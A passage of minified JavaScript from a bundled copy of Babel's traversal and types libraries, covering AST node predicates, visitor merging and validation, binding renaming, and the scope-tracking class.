Aj1.default}});Object.defineProperty(O1,"toBindingIdentifierName",{enumerable:!0,get:function(){return Xj1.default}});Object.defineProperty(O1,"toBlock",{enumerable:!0,get:function(){return Qj1.default}});Object.defineProperty(O1,"toComputedKey",{enumerable:!0,get:function(){return Jj1.default}});Object.defineProperty(O1,"toExpression",{enumerable:!0,get:function(){return Yj1.default}});Object.defineProperty(O1,"toIdentifier",{enumerable:!0,get:function(){return Wj1.default}});Object.defineProperty(O1,"toKeyAlias",{enumerable:!0,get:function(){return Gj1.default}});Object.defineProperty(O1,"toStatement",{enumerable:!0,get:function(){return Hj1.default}});Object.defineProperty(O1,"traverse",{enumerable:!0,get:function(){return OY.default}});Object.defineProperty(O1,"traverseFast",{enumerable:!0,get:function(){return Oj1.default}});Object.defineProperty(O1,"validate",{enumerable:!0,get:function(){return fj1.default}});Object.defineProperty(O1,"valueToNode",{enumerable:!0,get:function(){return $j1.default}});var xM1=SZ(),fM1=TZ(),hM1=n3(),yM1=s3(),h$=e3();Object.keys(h$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(MX,X))return;if(X in O1&&O1[X]===h$[X])return;Object.defineProperty(O1,X,{enumerable:!0,get:function(){return h$[X]}})});var gM1=JM(),WF=$M(),mM1=qM(),y$=M$();Object.keys(y$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(MX,X))return;if(X in O1&&O1[X]===y$[X])return;Object.defineProperty(O1,X,{enumerable:!0,get:function(){return y$[X]}})});var g$=c9();Object.keys(g$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(MX,X))return;if(X in O1&&O1[X]===g$[X])return;Object.defineProperty(O1,X,{enumerable:!0,get:function(){return g$[X]}})});var uM1=ZX(),cM1=DM(),lM1=wM(),pM1=CM(),dM1=SM(),iM1=_M(),rM1=F$(),nM1=O$(),aM1=A$(),oM1=L$(),sM1=R$(),tM1=yM(),m$=uM();Object.keys(m$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(MX,X))return;if(X in O1&&O1[X]===m$[X])return;Object.defineProperty(O1,X,{enumerable:!0,get:function(){return m$[X]}})});var u$=z5();Object.keys(u$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(MX,X))return;if(X in O1&&O1[X]===u$[X])return;Object.defineProperty(O1,X,{enumerable:!0,get:function(){return u$[X]}})});var eM1=pM(),Xj1=rM(),Qj1=N$(),Jj1=aM(),Yj1=tM(),Wj1=w$(),Gj1=$j(),Hj1=Kj(),$j1=qj(),c$=G6();Object.keys(c$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(MX,X))return;if(X in O1&&O1[X]===c$[X])return;Object.defineProperty(O1,X,{enumerable:!0,get:function(){return c$[X]}})});var zj1=Mj(),Uj1=Oj(),Kj1=Rj(),Vj1=C$(),Bj1=P$(),qj1=Z$(),Zj1=Dj(),Mj1=i4(),jj1=Cj(),Fj1=Ej(),OY=_j();Object.keys(OY).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(MX,X))return;if(X in O1&&O1[X]===OY[X])return;Object.defineProperty(O1,X,{enumerable:!0,get:function(){return OY[X]}})});var Oj1=I$(),Aj1=YY(),Rj1=H5(),Lj1=bj(),Dj1=hj(),Nj1=gj(),wj1=k$(),Ij1=q$(),Cj1=cj(),Pj1=lH(),Sj1=pj(),Ej1=ij(),Tj1=aj(),_j1=WY(),kj1=sj(),bj1=$5(),vj1=ej(),xj1=uH(),fj1=zY(),hj1=cH(),l$=d0();Object.keys(l$).forEach(function(X){if(X==="default"||X==="__esModule")return;if(Object.prototype.hasOwnProperty.call(MX,X))return;if(X in O1&&O1[X]===l$[X])return;Object.defineProperty(O1,X,{enumerable:!0,get:function(){return l$[X]}})});var yj1=G5(),gj1=YF(),AW0=O1.react={isReactComponent:xM1.default,isCompatTag:fM1.default,buildChildren:hM1.default};O1.toSequenceExpression=gj1.default;if(process.env.BABEL_TYPES_8_BREAKING)console.warn("BABEL_TYPES_8_BREAKING is not supported anymore. Use the latest Babel 8.0.0 pre-release instead!")});var d$=m((zF)=>{Object.defineProperty(zF,"__esModule",{value:!0});zF.isBindingIdentifier=zF1;zF.isBlockScoped=qF1;zF.isExpression=KF1;zF.isFlow=OF1;zF.isForAwaitStatement=LF1;zF.isGenerated=jF1;zF.isPure=FF1;zF.isReferenced=BF1;zF.isReferencedIdentifier=HF1;zF.isReferencedMemberExpression=$F1;zF.isRestProperty=AF1;zF.isScope=VF1;zF.isSpreadProperty=RF1;zF.isStatement=UF1;zF.isUser=MF1;zF.isVar=ZF1;var mj1=$0(),{isBinding:uj1,isBlockScoped:cj1,isExportDeclaration:lj1,isExpression:pj1,isFlow:dj1,isForStatement:ij1,isForXStatement:rj1,isIdentifier:HF,isImportDeclaration:nj1,isImportSpecifier:aj1,isJSXIdentifier:oj1,isJSXMemberExpression:sj1,isMemberExpression:tj1,isRestElement:$F,isReferenced:p$,isScope:ej1,isStatement:XF1,isVar:QF1,isVariableDeclaration:JF1,react:YF1,isForOfStatement:WF1}=mj1,{isCompatTag:GF1}=YF1;function HF1(X){let{node:Q,parent:J}=this;if(!HF(Q,X)&&!sj1(J,X))if(oj1(Q,X)){if(GF1(Q.name))return!1}else return!1;return p$(Q,J,this.parentPath.parent)}function $F1(){let{node:X,parent:Q}=this;return tj1(X)&&p$(X,Q)}function zF1(){let{node:X,parent:Q}=this,J=this.parentPath.parent;return HF(X)&&uj1(X,Q,J)}function UF1(){let{node:X,parent:Q}=this;if(XF1(X)){if(JF1(X)){if(rj1(Q,{left:X}))return!1;if(ij1(Q,{init:X}))return!1}return!0}else return!1}function KF1(){if(this.isIdentifier())return this.isReferencedIdentifier();else return pj1(this.node)}function VF1(){return ej1(this.node,this.parent)}function BF1(){return p$(this.node,this.parent)}function qF1(){return cj1(this.node)}function ZF1(){return QF1(this.node)}function MF1(){return this.node&&!!this.node.loc}function jF1(){return!this.isUser()}function FF1(X){return this.scope.isPure(this.node,X)}function OF1(){let{node:X}=this;if(dj1(X))return!0;else if(nj1(X))return X.importKind==="type"||X.importKind==="typeof";else if(lj1(X))return X.exportKind==="type";else if(aj1(X))return X.importKind==="type"||X.importKind==="typeof";else return!1}function AF1(){var X;return $F(this.node)&&((X=this.parentPath)==null?void 0:X.isObjectPattern())}function RF1(){var X;return $F(this.node)&&((X=this.parentPath)==null?void 0:X.isObjectExpression())}function LF1(){return WF1(this.node,{await:!0})}zF.isExistentialTypeParam=function(){throw Error("`path.isExistentialTypeParam` has been renamed to `path.isExistsTypeAnnotation()` in Babel 7.")},zF.isNumericLiteralTypeAnnotation=function(){throw Error("`path.isNumericLiteralTypeAnnotation()` has been renamed to `path.isNumberLiteralTypeAnnotation()` in Babel 7.")}});var AY=m((DF)=>{Object.defineProperty(DF,"__esModule",{value:!0});DF.environmentVisitor=dF1;DF.explode=AF;DF.isExplodedVisitor=OF;DF.merge=LF;DF.verify=RF;var FF=fH(),yF1=d$(),gF1=$0(),UF=S6(),{DEPRECATED_KEYS:KF,DEPRECATED_ALIASES:VF,FLIPPED_ALIAS_KEYS:BF,TYPES:mF1,__internal__deprecationWarning:qF}=gF1;function uF1(X){return X in FF}function OF(X){return X==null?void 0:X._exploded}function AF(X){if(OF(X))return X;X._exploded=!0;for(let Q of Object.keys(X)){if(tX(Q))continue;let J=Q.split("|");if(J.length===1)continue;let Y=X[Q];delete X[Q];for(let W of J)X[W]=Y}RF(X),delete X.__esModule,cF1(X),jF(X);for(let Q of Object.keys(X)){if(tX(Q))continue;if(!uF1(Q))continue;let J=X[Q];for(let W of Object.keys(J))J[W]=lF1(Q,J[W]);delete X[Q];let Y=FF[Q];if(Y!==null)for(let W of Y)if(X[W])r4(X[W],J);else X[W]=J;else r4(X,J)}for(let Q of Object.keys(X)){if(tX(Q))continue;let J=BF[Q];if(Q in KF){let W=KF[Q];qF(Q,W,"Visitor "),J=[W]}else if(Q in VF){let W=VF[Q];qF(Q,W,"Visitor "),J=BF[W]}if(!J)continue;let Y=X[Q];delete X[Q];for(let W of J){let G=X[W];if(G)r4(G,Y);else X[W]=Object.assign({},Y)}}for(let Q of Object.keys(X)){if(tX(Q))continue;jF(X[Q])}return X}function RF(X){if(X._verified)return;if(typeof X==="function")throw Error("You passed `traverse()` a function when it expected a visitor object, are you sure you didn't mean `{ enter: Function }`?");for(let Q of Object.keys(X)){if(Q==="enter"||Q==="exit")ZF(Q,X[Q]);if(tX(Q))continue;if(!mF1.includes(Q))throw Error(`You gave us a visitor for the node type ${Q} but it's not a valid type in @babel/traverse 7.28.4`);let J=X[Q];if(typeof J==="object")for(let Y of Object.keys(J))if(Y==="enter"||Y==="exit")ZF(`${Q}.${Y}`,J[Y]);else throw Error(`You passed \`traverse()\` a visitor object with the property ${Q} that has the invalid property ${Y}`)}X._verified=!0}function ZF(X,Q){let J=[].concat(Q);for(let Y of J)if(typeof Y!=="function")throw TypeError(`Non-function found defined in ${X} with type ${typeof Y}`)}function LF(X,Q=[],J){let Y={_verified:!0,_exploded:!0};Object.defineProperty(Y,"_exploded",{enumerable:!1}),Object.defineProperty(Y,"_verified",{enumerable:!1});for(let W=0;W<X.length;W++){let G=AF(X[W]),H=Q[W],$=G;if(H||J)$=MF($,H,J);r4(Y,$);for(let z of Object.keys(G)){if(tX(z))continue;let U=G[z];if(H||J)U=MF(U,H,J);let K=Y[z]||(Y[z]={});r4(K,U)}}return Y}function MF(X,Q,J){let Y={};for(let W of["enter","exit"]){let G=X[W];if(!Array.isArray(G))continue;G=G.map(function(H){let $=H;if(Q)$=function(z){H.call(Q,z,Q)};if(J)$=J(Q==null?void 0:Q.key,W,$);if($!==H)$.toString=()=>H.toString();return $}),Y[W]=G}return Y}function cF1(X){for(let Q of Object.keys(X)){if(tX(Q))continue;let J=X[Q];if(typeof J==="function")X[Q]={enter:J}}}function jF(X){if(X.enter&&!Array.isArray(X.enter))X.enter=[X.enter];if(X.exit&&!Array.isArray(X.exit))X.exit=[X.exit]}function lF1(X,Q){let J=`is${X}`,Y=yF1[J],W=function(G){if(Y.call(G))return Q.apply(this,arguments)};return W.toString=()=>Q.toString(),W}function tX(X){if(X[0]==="_")return!0;if(X==="enter"||X==="exit"||X==="shouldSkip")return!0;if(X==="denylist"||X==="noScope"||X==="skipKeys")return!0;if(X==="blacklist")return!0;return!1}function r4(X,Q){for(let J of["enter","exit"]){if(!Q[J])continue;X[J]=[].concat(X[J]||[],Q[J])}}var pF1={FunctionParent(X){if(X.isArrowFunctionExpression())return;if(X.skip(),X.isMethod())if(!X.requeueComputedKeyAndDecorators)UF.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()},Property(X){if(X.isObjectProperty())return;if(X.skip(),!X.requeueComputedKeyAndDecorators)UF.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()}};function dF1(X){return LF([pF1,X])}});var CF=m((wF)=>{Object.defineProperty(wF,"__esModule",{value:!0});wF.default=void 0;var RY=$0(),sF1=RY,tF1=LY(),eF1=AY(),XO1=S6(),{getAssignmentIdentifiers:QO1}=sF1,JO1={ReferencedIdentifier({node:X},Q){if(X.name===Q.oldName)X.name=Q.newName},Scope(X,Q){if(!X.scope.bindingIdentifierEquals(Q.oldName,Q.binding.identifier)){if(X.skip(),X.isMethod())if(!X.requeueComputedKeyAndDecorators)XO1.requeueComputedKeyAndDecorators.call(X);else X.requeueComputedKeyAndDecorators()}},ObjectProperty({node:X,scope:Q},J){let{name:Y}=X.key;if(X.shorthand&&(Y===J.oldName||Y===J.newName)&&Q.getBindingIdentifier(Y)===J.binding.identifier){X.shorthand=!1;{var W;if((W=X.extra)!=null&&W.shorthand)X.extra.shorthand=!1}}},"AssignmentExpression|Declaration|VariableDeclarator"(X,Q){if(X.isVariableDeclaration())return;let J=X.isAssignmentExpression()?QO1(X.node):X.getOuterBindingIdentifiers();for(let Y in J)if(Y===Q.oldName)J[Y].name=Q.newName}};class NF{constructor(X,Q,J){this.newName=J,this.oldName=Q,this.binding=X}maybeConvertFromExportDeclaration(X){let Q=X.parentPath;if(!Q.isExportDeclaration())return;if(Q.isExportDefaultDeclaration()){let{declaration:J}=Q.node;if(RY.isDeclaration(J)&&!J.id)return}if(Q.isExportAllDeclaration())return;Q.splitExportDeclaration()}maybeConvertFromClassFunctionDeclaration(X){return X}maybeConvertFromClassFunctionExpression(X){return X}rename(){let{binding:X,oldName:Q,newName:J}=this,{scope:Y,path:W}=X,G=W.find((z)=>z.isDeclaration()||z.isFunctionExpression()||z.isClassExpression());if(G){if(G.getOuterBindingIdentifiers()[Q]===X.identifier)this.maybeConvertFromExportDeclaration(G)}let H=arguments[0]||Y.block,$={discriminant:!0};if(RY.isMethod(H)){if(H.computed)$.key=!0;if(!RY.isObjectMethod(H))$.decorators=!0}if((0,tF1.traverseNode)(H,(0,eF1.explode)(JO1),Y,this,Y.path,$),!arguments[0])Y.removeOwnBinding(Q),Y.bindings[J]=X,this.binding.identifier.name=J;if(G)this.maybeConvertFromClassFunctionDeclaration(W),this.maybeConvertFromClassFunctionExpression(W)}}wF.default=NF});var TF=m((SF)=>{Object.defineProperty(SF,"__esModule",{value:!0});SF.default=void 0;class PF{constructor({identifier:X,scope:Q,path:J,kind:Y}){if(this.identifier=void 0,this.scope=void 0,this.path=void 0,this.kind=void 0,this.constantViolations=[],this.constant=!0,this.referencePaths=[],this.referenced=!1,this.references=0,this.identifier=X,this.scope=Q,this.path=J,this.kind=Y,(Y==="var"||Y==="hoisted")&&YO1(J))this.reassign(J);this.clearValue()}deoptValue(){this.clearValue(),this.hasDeoptedValue=!0}setValue(X){if(this.hasDeoptedValue)return;this.hasValue=!0,this.value=X}clearValue(){this.hasDeoptedValue=!1,this.hasValue=!1,this.value=null}reassign(X){if(this.constant=!1,this.constantViolations.includes(X))return;this.constantViolations.push(X)}reference(X){if(this.referencePaths.includes(X))return;this.referenced=!0,this.references++,this.referencePaths.push(X)}dereference(){this.references--,this.referenced=!!this.references}}SF.default=PF;function YO1(X){let Q=!X.isVariableDeclarator()||X.node.init;for(let{parentPath:J,key:Y}=X;J;{parentPath:J,key:Y}=J){if(J.isFunctionParent())return!1;if(Y==="left"&&J.isForXStatement()||Q&&Y==="body"&&J.isLoop())return!0}return!1}});var eX=m((bF)=>{Object.defineProperty(bF,"__esModule",{value:!0});bF.clear=GO1;bF.clearPath=_F;bF.clearScope=kF;bF.getCachedPaths=HO1;bF.getOrCreateCachedPaths=$O1;bF.scope=bF.path=void 0;var DY=bF.path=new WeakMap,WO1=bF.scope=new WeakMap;function GO1(){_F(),kF()}function _F(){bF.path=DY=new WeakMap}function kF(){bF.scope=WO1=new WeakMap}function HO1(X){let{parent:Q,parentPath:J}=X;return DY.get(Q)}function $O1(X,Q){let J=DY.get(X);if(!J)DY.set(X,J=new Map);return J}});var xF=m((EW0,qO1)=>{qO1.exports=["decodeURI","decodeURIComponent","encodeURI","encodeURIComponent","escape","eval","globalThis","isFinite","isNaN","parseFloat","parseInt","undefined","unescape"]});var fF=m((TW0,ZO1)=>{ZO1.exports=["AggregateError","Array","ArrayBuffer","Atomics","BigInt","BigInt64Array","BigUint64Array","Boolean","DataView","Date","Error","EvalError","FinalizationRegistry","Float16Array","Float32Array","Float64Array","Function","Infinity","Int16Array","Int32Array","Int8Array","Intl","Iterator","JSON","Map","Math","NaN","Number","Object","Promise","Proxy","RangeError","ReferenceError","Reflect","RegExp","Set","SharedArrayBuffer","String","Symbol","SyntaxError","TypeError","Uint16Array","Uint32Array","Uint8Array","Uint8ClampedArray","URIError","WeakMap","WeakRef","WeakSet"]});var o$=m((tF)=>{Object.defineProperty(tF,"__esModule",{value:!0});tF.default=void 0;var MO1=CF(),dF=a4(),jO1=TF(),iF=$0(),rF=iF,hF=eX(),FO1=xF(),OO1=fF(),{assignmentExpression:AO1,callExpression:yF,cloneNode:gF,getBindingIdentifiers:nF,identifier:Q7,isArrayExpression:aF,isBinary:RO1,isCallExpression:mF,isClass:LO1,isClassBody:DO1,isClassDeclaration:NO1,isExportAllDeclaration:oF,isExportDefaultDeclaration:wO1,isExportNamedDeclaration:r$,isFunctionDeclaration:IO1,isIdentifier:X7,isImportDeclaration:n$,isLiteral:CO1,isMemberExpression:PO1,isMethod:SO1,isModuleSpecifier:EO1,isNullLiteral:TO1,isObjectExpression:_O1,isProperty:kO1,isPureish:bO1,isRegExpLiteral:vO1,isSuper:xO1,isTaggedTemplateExpression:fO1,isTemplateLiteral:sF,isThisExpression:uF,isUnaryExpression:hO1,isVariableDeclaration:yO1,expressionStatement:gO1,matchesPattern:cF,memberExpression:a$,numericLiteral:mO1,toIdentifier:uO1,variableDeclaration:cO1,variableDeclarator:lO1,isRecordExpression:pO1,isTupleExpression:dO1,isObjectProperty:iO1,isTopicReference:lF,isMetaProperty:rO1,isPrivateName:nO1,isExportDeclaration:aO1,buildUndefinedNode:oO1,sequenceExpression:sO1}=iF;function T0(X,Q){switch(X==null?void 0:X.type){default:if(n$(X)||aO1(X)){var J;if((oF(X)||r$(X)||n$(X))&&X.source)T0(X.source,Q);else if((r$(X)||n$(X))&&(J=X.specifiers)!=null&&J.length)for(let Y of X.specifiers)T0(Y,Q);else if((wO1(X)||r$(X))&&X.declaration)T0(X.declaration,Q)}else if(EO1(X))T0(X.local,Q);else if(CO1(X)&&!TO1(X)&&!vO1(X)&&!sF(X))Q.push(X.value);break;case"MemberExpression":case"OptionalMemberExpression":case"JSXMemberExpression":T0(X.object,Q),T0(X.property,Q);break;case"Identifier":case"JSXIdentifier":Q.push(X.name);break;case"CallExpression":case"OptionalCallExpression":case"NewExpression":T0(X.callee,Q);break;case"ObjectExpression":case"ObjectPattern":for(let Y of X.properties)T0(Y,Q);break;case"SpreadElement":case"RestElement":T0(X.argument,Q);break;case"ObjectProperty":case"ObjectMethod":case"ClassProperty":case"ClassMethod":case"ClassPrivateProperty":case"ClassPrivateMethod":T0(X.key,Q);break;case"ThisExpression":Q.push("this");break;case"Super":Q.push("super");break;case"Import":case"ImportExpression":Q.push("import");break;case"DoExpression":Q.push("do");break;case"YieldExpression":Q.push("yield"),T0(X.argument,Q);break;case"AwaitExpression":Q.push("await"),T0(X.argument,Q);break;case"AssignmentExpression":T0(X.left,Q);break;case"VariableDeclarator":T0(X.id,Q);break;case"FunctionExpression":case"FunctionDeclaration":case"ClassExpression":case"ClassDeclaration":T0(X.id,Q);break;case"PrivateName":T0(X.id,Q);break;case"ParenthesizedExpression":T0(X.expression,Q);break;case"UnaryExpression":case"UpdateExpression":T0(X.argument,Q);break;case"MetaProperty":T0(X.meta,Q),T0(X.property,Q);break;case"JSXElement":T0(X.openingElement,Q);break;case"JSXOpeningElement":T0(X.name,Q);break;case"JSXFragment":T0(X.openingFragment,Q);break;case"JSXOpeningFragment":Q.push("Fragment");break;case"JSXNamespacedName":T0(X.namespace,Q),T0(X.name,Q);break}}function pF(X){X.references=Object.create(null),X.uids=Object.create(null),X.bindings=Object.create(null),X.globals=Object.create(null)}NY=Symbol.for("should not be considered a local binding");var NY,tO1={ForStatement(X){let Q=X.get("init");if(Q.isVar()){let{scope:J}=X;(J.getFunctionParent()||J.getProgramParent()).registerBinding("var",Q)}},Declaration(X){if(X.isBlockScoped())return;if(X.isImportDeclaration())return;if(X.isExportDeclaration())return;(X.scope.getFunctionParent()||X.scope.getProgramParent()).registerDeclaration(X)},ImportDeclaration(X){X.scope.getBlockParent().registerDeclaration(X)},TSImportEqualsDeclaration(X){X.scope.getBlockParent().registerDeclaration(X)},ReferencedIdentifier(X,Q){if(rF.isTSQualifiedName(X.parent)&&X.parent.right===X.node)return;if(X.parentPath.isTSImportEqualsDeclaration())return;Q.references.push(X)},ForXStatement(X,Q){let J=X.get("left");if(J.isPattern()||J.isIdentifier())Q.constantViolations.push(X);else if(J.isVar()){let{scope:Y}=X;(Y.getFunctionParent()||Y.getProgramParent()).registerBinding("var",J)}},ExportDeclaration:{exit(X){let{node:Q,scope:J}=X;if(oF(Q))return;let Y=Q.declaration;if(NO1(Y)||IO1(Y)){let W=Y.id;if(!W)return;let G=J.getBinding(W.name);G==null||G.reference(X)}else if(yO1(Y))for(let W of Y.declarations)for(let G of Object.keys(nF(W))){let H=J.getBinding(G);H==null||H.reference(X)}}},LabeledStatement(X){X.scope.getBlockParent().registerDeclaration(X)},AssignmentExpression(X,Q){Q.assignments.push(X)},UpdateExpression(X,Q){Q.constantViolations.push(X)},UnaryExpression(X,Q){if(X.node.operator==="delete")Q.constantViolations.push(X)},BlockScoped(X){let Q=X.scope;if(Q.path===X)Q=Q.parent;if(Q.getBlockParent().registerDeclaration(X),X.isClassDeclaration()&&X.node.id){let W=X.node.id.name;X.scope.bindings[W]=X.scope.parent.getBinding(W)}},CatchClause(X){X.scope.registerBinding("let",X)},Function(X){let Q=X.get("params");for(let J of Q)X.scope.registerBinding("param",J);if(X.isFunctionExpression()&&X.node.id&&!X.node.id[NY])X.scope.registerBinding("local",X.get("id"),X)},ClassExpression(X){if(X.node.id&&!X.node.id[NY])X.scope.registerBinding("local",X.get("id"),X)},TSTypeAnnotation(X){X.skip()}},n4,eO1=0;class $6{constructor(X){this.uid=void 0,this.path=void 0,this.block=void 0,this.inited=void 0,this.labels=void 0,this.bindings=void 0,this.referencesSet=void 0,this.globals=void 0,this.uidsSet=void 0,this.data=void 0,this.crawling=void 0;let{node:Q}=X,J=hF.scope.get(Q);if((J==null?void 0:J.path)===X)return J;hF.scope.set(Q,this),this.uid=eO1++,this.block=Q,this.path=X,this.labels=new Map,this.inited=!1,Object.defineProperties(this,{references:{enumerable:!0,configurable:!0,writable:!0,value:Object.create(null)},uids:{enumerable:!0,configurable:!0,writable:!0,value:Object.create(null)}})}get parent(){var X;let Q,J=this.path;do{var Y;let W=J.key==="key"||J.listKey==="decorators";if(J=J.parentPath,W&&J.isMethod())J=J.parentPath;if((Y=J)!=null&&Y.isScope())Q=J}while(J&&!Q);return(X=Q)==null?void 0:X.scope}get references(){throw Error("Scope#references is not available in Babel 8. Use Scope#referencesSet instead.")}get uids(){throw Error("Scope#uids is not available in Babel 8. Use Scope#uidsSet instead.")}generateDeclaredUidIdentifier(X){let Q=this.generateUidIdentifier(X);return this.push({id:Q}),gF(Q)}generateUidIdentifier(X){return Q7(this.generateUid(X))}generateUid(X="temp"){X=uO1(X).replace(/^_+/,"").replace(/\d+$/g,"");let Q,J=0;do{if(Q=`_${X}`,J>=11)Q+=J-1;else if(J>=9)Q+=J-9;else if(J>=1)Q+=J+1;J++}while(this.hasLabel(Q)||this.hasBinding(Q)||this.hasGlobal(Q)||this.hasReference(Q));let Y=this.getProgramParent();return Y.references[Q]=!0,Y.uids[Q]=!0,Q}generateUidBasedOnNode(X,Q){let J=[];T0(X,J);let Y=J.join("$");return Y=Y.replace(/^_/,"")||Q||"ref",this.generateUid(Y.slice(0,20))}generateUidIdentifierBasedOnNode(X,Q){return Q7(this.generateUidBasedOnNode(X,Q))}isStatic(X){if(uF(X)||xO1(X)||lF(X))return!0;if(X7(X)){let Q=this.getBinding(X.name);if(Q)return Q.constant;else return this.hasBinding(X.name)}return!1}maybeGenerateMemoised(X,Q){if(this.isStatic(X))return null;else{let J=this.generateUidIdentifierBasedOnNode(X);if(!Q)return this.push({id:J}),gF(J);return J}}checkBlockScopedCollisions(X,Q,J,Y){if(Q==="param")return;if(X.kind==="local")return;if(Q==="let"||X.kind==="let"||X.kind==="const"||X.kind==="module"||X.kind==="param"&&Q==="const")throw this.path.hub.buildError(Y,`Duplicate declaration "${J}"`,TypeError)}rename(X,Q){let J=this.getBinding(X);if(J)Q||(Q=this.generateUidIdentifier(X).name),new MO1.default(J,X,Q).rename(arguments[2])}dump(){let X="-".repeat(60);console.log(X);let Q=this;do{console.log("#",Q.block.type);for(let J of Object.keys(Q.bindings)){let Y=Q.bindings[J];console.log(" -",J,{constant:Y.constant,references:Y.references,violations:Y.constantViolations.length,kind:Y.kind})}}while(Q=Q.parent);console.log(X)}hasLabel(X){return!!this.getLabel(X)}getLabel(X){return this.labels.get(X)}registerLabel(X){this.labels.set(X.node.label.name,X)}registerDeclaration(X){if(X.isLabeledStatement())this.registerLabel(X);else if(X.isFunctionDeclaration())this.registerBinding("hoisted",X.get("id"),X);else if(X.isVariableDeclaration()){let Q=X.get("declarations"),{kind:J}=X.node;for(let Y of Q)this.registerBinding(J==="using"||J==="await using"?"const":J,Y)}else if(X.isClassDeclaration()){if(X.node.declare)return;this.registerBinding("let",X)}else if(X.isImportDeclaration()){let Q=X.node.importKind==="type"||X.node.importKind==="typeof",J=X.get("specifiers");for(let Y of J){let W=Q||Y.isImportSpecifier()&&(Y.node.importKind==="type"||Y.node.importKind==="typeof");this.registerBinding(W?"unknown":"module",Y)}}else if(X.isExportDeclaration()){let Q=X.get("declaration");if(Q.isClassDeclaration()||Q.isFunctionDeclaration()||Q.isVariableDeclaration())this.registerDeclaration(Q)}else this.registerBinding("unknown",X)}buildUndefinedNode(){return oO1()}registerConstantViolation(X){let Q=X.getAssignmentIdentifiers();for(let Y of Object.keys(Q)){var J;(J=this.getBinding(Y))==null||J.reassign(X)}}registerBinding(X,Q,J=Q){if(!X)throw ReferenceError("no `kind`");if(Q.isVariableDeclaration()){let G=Q.get("declarations");for(let H of G)this.registerBinding(X,H);return}let Y=this.getProgramParent(),W=Q.getOuterBindingIdentifiers(!0);for(let G of Object.keys(W)){Y.references[G]=!0;for(let H of W[G]){let $=this.getOwnBinding(G);if($){if($.identifier===H)continue;this.checkBlockScopedCollisions($,X,G,H)}if($)$.reassign(J);else this.bindings[G]=new jO1.default({identifier:H,scope:this,path:J,kind:X})}}}addGlobal(X){this.globals[X.name]=X}hasUid(X){{let Q=this;do if(Q.uids[X])return!0;while(Q=Q.parent);return!1}}hasGlobal(X){let Q=this;do if(Q.globals[X])return!0;while(Q=Q.parent);return!1}hasReference(X){return!!this.getProgramParent().references[X]}isPure(X,Q){if(X7(X)){let G=this.getBinding(X.name);if(!G)return!1;if(Q)return G.constant;return!0}else if(uF(X)||rO1(X)||lF(X)||nO1(X))return!0;else if(LO1(X)){var J;if(X.superClass&&!this.isPure(X.superClass,Q))return!1;if(((J=X.decorators)==null?void 0:J.length)>0)return!1;return this.isPure(X.body,Q)}else if(DO1(X)){for(let G of X.body)if(!this.isPure(G,Q))return!1;return!0}else if(RO1(X))return this.isPure(X.left,Q)&&this.isPure(X.right,Q);else if(aF(X)||dO1(X)){for(let G of X.elements)if(G!==null&&!this.isPure(G,Q))return!1;return!0}else if(_O1(X)||pO1(X)){for(let G of X.properties)if(!this.isPure(G,Q))return!1;return!0}else if(SO1(X)){var Y;if(X.computed&&!this.isPure(X.key,Q))return!1;if(((Y=X.decorators)==null?void 0:Y.length)>0)return!1;return!0}else if(kO1(X)){var W;if(X.computed&&!this.isPure(X.key,Q))return!1;if(((W=X.decorators)==null?void 0:W.length)>0)return!1;if(iO1(X)||X.static){if(X.value!==null&&!this.isPure(X.value,Q))return!1}return!0}else if(hO1(X))return this.isPure(X.argument,Q);else if(sF(X)){for(let G of X.expressions)if(!this.isPure(G,Q))return!1;return!0}else if(fO1(X))return cF(X.tag,"String.raw")&&!this.hasBinding("String",{noGlobals:!0})&&this.isPure(X.quasi,Q);else if(PO1(X))return!X.computed&&X7(X.object)&&X.object.name==="Symbol"&&X7(X.property)&&X.property.name!=="for"&&!this.hasBinding("Symbol",{noGlobals:!0});else if(mF(X))return cF(X.callee,"Symbol.for")&&!this.hasBinding("Symbol",{noGlobals:!0})&&X.arguments.length===1&&rF.isStringLiteral(X.arguments[0]);else return bO1(X)}setData(X,Q){return this.data[X]=Q}getData(X){let Q=this;do{let J=Q.data[X];if(J!=null)return J}while(Q=Q.parent)}removeData(X){let Q=this;do if(Q.data[X]!=null)Q.data[X]=null;while(Q=Q.parent)}init(){if(!this.inited)this.inited=!0,this.crawl()}crawl(){let X=this.path;pF(this),this.data=Object.create(null);let Q=this;do{if(Q.crawling)return;if(Q.path.isProgram())break}while(Q=Q.parent);let J=Q,Y={references:[],constantViolations:[],assignments:[]};if(this.crawling=!0,n4||(n4=dF.default.visitors.merge([{Scope(W){pF(W.scope)}},tO1])),X.type!=="Program"){for(let G of n4.enter)G.call(Y,X,Y);let W=n4[X.type];if(W)for(let G of W.enter)G.call(Y,X,Y)}X.traverse(n4,Y),this.crawling=!1;for(let W of Y.assignments){let G=W.getAssignmentIdentifiers();for(let H of Object.keys(G)){if(W.scope.getBinding(H))continue;J.addGlobal(G[H])}W.scope.registerConstantViolation(W)}for(let W of Y.references){let G=W.scope.getBinding(W.node.name);if(G)G.reference(W);else J.addGlobal(W.node)}for(let W of Y.constantViolations)W.scope.registerConstantViolation(W)}push(X){let Q=this.path;if(Q.isPattern())Q=this.getPatternParent().path;else if(!Q.isBlockStatement()&&!Q.isProgram())Q=this.getBlockParent().path;if(Q.isSwitchStatement())Q=(this.getFunctionParent()||this.getProgramParent()).path;let{init:J,unique:Y,kind:W="var",id:G}=X;if(!J&&!Y&&(W==="var"||W==="let")&&Q.isFunction()&&!Q.node.name&&mF(Q.parent,{callee:Q.node})&&Q.parent.arguments.length<=Q.node.params.length&&X7(G)){Q.pushContainer("params",G),Q.scope.registerBinding("param",Q.get("params")[Q.node.params.length-1]);return}if(Q.isLoop()||Q.isCatchClause()||Q.isFunction())Q.ensureBlock(),Q=Q.get("body");let H=X._blockHoist==null?2:X._blockHoist,$=`declaration:${W}:${H}`,z=!Y&&Q.getData($);if(!z){let 